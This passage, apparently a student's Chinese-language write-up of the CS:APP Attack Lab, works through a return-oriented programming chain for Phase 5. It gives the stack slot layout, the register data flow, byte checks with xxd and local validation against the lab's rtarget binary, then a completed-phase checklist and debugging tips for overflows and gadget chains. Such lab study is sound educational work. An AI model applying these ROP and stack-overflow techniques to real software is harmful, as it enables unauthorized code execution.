B+0x48：G4
B+0x50：G5
B+0x58：G6
B+0x60：G7
B+0x68：G8
B+0x70：T
B+0x78：8 个 ASCII 十六进制字符
B+0x80：00
```

第一次 `getbuf ret` 读取 `B+0x28` 后，进入 G1 时：

```text
rsp = B+0x30
rax = B+0x30
```

G2 得到：

```text
rdi = B+0x30
```

G3 从 `B+0x40` 取出：

```text
rax = 0x48
```

经过 G4、G5、G6：

```text
rsi = 0x48
```

G7 计算：

```text
rax = rdi + rsi
    = (B+0x30) + 0x48
    = B+0x78
```

G8 将结果放入：

```text
rdi = B+0x78
```

最后进入 `touch3`，`%rdi` 正好指向字符串。

### 15.5 Phase 5 的输入检查

使用：

```bash
wc -w phase5.hex
./hex2raw < phase5.hex > phase5.raw
xxd -g 1 -c 16 phase5.raw
```

实际得到：

```text
phase5.hex：129 个字节 token
phase5.raw：有效布局后有字符串终止符和工具追加的换行
```

长度计算：

```text
40 字节填充
+ 10 个 8 字节槽（G1、G2、G3、offset、G4、G5、G6、G7、G8、T）
+ 9 字节字符串
= 129 字节
```

`xxd` 确认：

```text
0x00--0x27：40 个 41
0x28--0x77：ROP 地址和 offset
0x78--0x7f：ASCII 字符串
0x80：00
0x81：0a
```

地址和偏移按小端序写入；字符串按正常字符顺序写入。`0a` 位于字符串终止符 `00` 之后，不影响 C 字符串。

### 15.6 Phase 5 本地验证

使用：

```bash
./rtarget -q < phase5.raw
```

最终输出为：

```text
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
```

因此 Phase 5 已经通过本地验证。结合前面 Phase 1--4 的通过结果，Attack Lab 五个阶段全部完成。

`-q` 模式下的 `PASS: Would have posted` 表示程序只打印模拟提交内容，没有实际连接评分服务器。

## 16. 全部阶段完成情况

```text
[完成] 环境与实验文件确认
[完成] 使用 -q 进行本地运行
[完成] test -> getbuf -> Gets 调用链分析
[完成] getbuf 栈空间和返回槽偏移推导
[完成] Phase 1：控制流重定向到 touch1
[完成] Phase 2：代码注入设置 %edi 并进入 touch2
[完成] Phase 3：代码注入设置字符串指针并进入 touch3
[完成] Phase 4：基础 ROP 设置 %edi 并进入 rtarget/touch2
[完成] Phase 5：ROP 动态计算字符串地址并进入 rtarget/touch3
```

## 17. 总结性调试方法

本次实验最终形成的通用流程是：

```text
先看目标函数接口和 cmp/strncmp 的数据流
→ 用 objdump 阅读静态指令
→ 用 GDB 在关键入口观察寄存器和栈
→ 明确每个 ret/pop/push 的 rsp 消耗
→ 先写抽象数据流，再寻找对应 gadget
→ 用 xxd 按偏移核对原始字节
→ 使用 -q 在本地验证
→ 用 bt 和故障现场定位失败阶段
```

关键经验：

- AT&T 语法源操作数在前、目标操作数在后；
- `ret` 和 `pop` 都会消耗 8 字节栈槽，`nop` 不消耗栈；
- 地址和整数按小端序，字符串按正常字符顺序；
- 输入总长度本身不决定是否段错误，ROP 链的栈消耗和 ABI 对齐才决定后续函数是否安全；
- `bt` 用于定位调用链，不一定能可靠恢复手工 `ret` 链之后的所有旧栈帧；
- ROP gadget 可以从函数机器码中间开始，但必须重新反汇编确认指令序列最终到达 `ret`；
- 随机栈地址不能硬编码，应该使用 `mov %rsp` 和相对偏移动态计算；
- `movl` 会清零目标 64 位寄存器的高 32 位，传递地址和传递小偏移时要分别判断是否安全。
